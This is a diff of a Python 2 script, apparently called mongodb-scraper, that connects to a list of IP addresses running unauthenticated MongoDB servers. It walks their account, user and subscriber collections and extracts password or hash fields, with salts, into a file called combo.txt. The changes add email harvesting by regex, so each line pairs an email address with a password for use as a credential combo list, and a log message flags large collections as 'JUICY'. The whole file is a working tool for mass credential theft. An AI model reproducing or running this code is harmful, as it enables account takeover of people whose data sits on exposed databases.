@@ -1,24 +1,12 @@
+# coding=utf-8
 import logging
 import json
+import re
 from colorlog import ColoredFormatter
 from pymongo import MongoClient
 
 
 def scrape():
-    try:
-        with open('data.json', 'r') as data_json:
-            ips = json.load(data_json)
-    except (IOError, ValueError):
-        print "Please provide a valid JSON encoded file in data.json"
-        return
-
-    try:
-        with open('processed.json', 'r') as processed_json:
-            processed = json.load(processed_json)
-    except (IOError, ValueError):
-        # Meh, I'll live with that...
-        processed = []
-
     mongo_logger = logging.getLogger('mongodb-scraper')
     logging.basicConfig(level=logging.DEBUG,
                         format='%(asctime)s|%(levelname)-8s| %(message)s',
@@ -31,6 +19,29 @@ def scrape():
     formatter = ColoredFormatter("%(log_color)s[%(levelname)-4s] %(message)s%(reset)s")
     console.setFormatter(formatter)
     mongo_logger.addHandler(console)
+
+    mongo_logger.info("Opening data")
+
+    email_regex = re.compile(r'[a-z0-9\-\._]+@[a-z0-9\-\.]+\.[a-z]{2,4}')
+
+    try:
+        with open('data.json', 'r') as data_json:
+            ips = json.load(data_json)
+    except (IOError, ValueError):
+        print "Please provide a valid JSON encoded file in data.json"
+        return
+
+    mongo_logger.info("Found " + str(len(ips)) + " IPs to connect")
+
+    try:
+        with open('processed.json', 'r') as processed_json:
+            processed = json.load(processed_json)
+    except (IOError, ValueError):
+        # Meh, I'll live with that...
+        processed = []
+
+    if processed:
+        mongo_logger.info("Found " + str(len(processed)) + " already processed IP")
 
     table_names = ['account', 'user', 'subscriber']
     column_names = ['pass', 'pwd']
@@ -45,13 +56,14 @@ def scrape():
         try:
             client = MongoClient(ip, connectTimeoutMS=5000)
             dbs = client.database_names()
+        except (KeyboardInterrupt, SystemExit):
+            return
         except:
             mongo_logger.warning("An error occurred while connecting to " + ip + ". Skipping")
             # Don't cry if we can't connect to the server
             processed.append(ip)
             continue
 
-        mongo_logger.info("Found " + str(len(dbs)) + " databases")
         mongo_logger.debug("Database found: " + ', '.join(dbs))
 
         for db in dbs:
@@ -63,9 +75,9 @@ def scrape():
 
             try:
                 collections = o_db.collection_names()
-                mongo_logger.info("\tFound " + str(len(collections)) + " collections")
-                mongo_logger.debug("\tCollection found: " + ', '.join(collections))
-            except:
+            except (KeyboardInterrupt, SystemExit):
+                return
+            except Exception:
                 # Don't cry if something bad happens
                 mongo_logger.warning("\tAn error occurred while fetching collections from " + ip + ". Skipping.")
                 break
@@ -78,7 +90,12 @@ def scrape():
 
                 o_coll = o_db[collection]
 
-                row = o_coll.find_one()
+                try:
+                    row = o_coll.find_one()
+                except:
+                    # Sometimes the collection is broken, let's skip it
+                    continue
+
                 interesting = False
 
                 # If the collection is empty I get a null row
@@ -95,23 +112,47 @@ def scrape():
                 if not interesting:
                     continue
 
+                mongo_logger.info("Table with interesting data found")
+
                 rows = o_coll.find()
                 total = rows.count()
 
                 if total > 750:
-                    mongo_logger.info("***FOUND COLLECTION WITH MORE THAN 750 RECORDS. JUICY!!")
+                    mongo_logger.info("***FOUND COLLECTION WITH " + str(total) + "  RECORDS. JUICY!!")
 
                 lines = []
+                email = ''
+
                 for row in rows:
                     for key, value in row.iteritems():
+                        # If we find anything that resemble an email address, let's store it
+                        if isinstance(value, basestring):
+                            matches = re.findall(email_regex, value.encode('utf-8'))
+
+                            if len(matches):
+                                email = matches[0]
+
                         # Is that a column we're interested into?
                         if any(column in key for column in column_names):
-                            # Convert null values to empty string
+                            # Skip empty values
                             if not value:
-                                value = ''
-                            lines.append(ip + '|' + str(value) + '\n')
+                                continue
 
-                with open('passwords.txt', 'a') as fp_pass:
+                            # Skip fields that are not strings (ie reset_pass_date => datetime object)
+                            if not isinstance(value, basestring):
+                                continue
+
+                            # Try to fetch the salt, if any
+                            try:
+                                salt = row['salt'].encode('utf-8')
+                            except:
+                                salt = ''
+
+                            value = value.encode('utf-8') + ':' + salt
+
+                            lines.append(ip.encode('utf-8') + '|' + email + ':' + value + '\n')
+
+                with open('combo.txt', 'a') as fp_pass:
                     fp_pass.writelines(lines)
 
         client.close()
